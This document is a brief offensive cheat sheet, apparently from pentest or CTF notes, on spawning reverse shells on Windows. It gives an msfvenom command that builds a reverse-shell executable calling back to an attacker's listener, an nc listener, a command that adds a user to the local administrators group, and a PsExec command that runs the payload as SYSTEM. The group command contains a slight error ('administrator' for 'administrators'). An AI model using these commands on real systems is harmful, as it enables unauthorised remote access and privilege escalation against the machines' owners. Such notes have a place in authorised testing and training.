# Reverse Shell
There are different ways to spawn shells in Windows.

## msfvenom

```console
# From kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe -o /home/kali/Desktop/reverse.exe
rlwrap nc -nvlp {PORT}
```

## RDP
If RDP is available, we can add out user to the administrators group and spawn an administrator command prompt with the following command with 

```console
# From target
net localgroup administrator {USERNAME} /add
```

## Admin -> System
To escalate from an admin user to full SYSTEM user, we can use the tool `PsExec` 

``` console
.\PsExec64.exe -accepteula -i -s reverse.exe
```
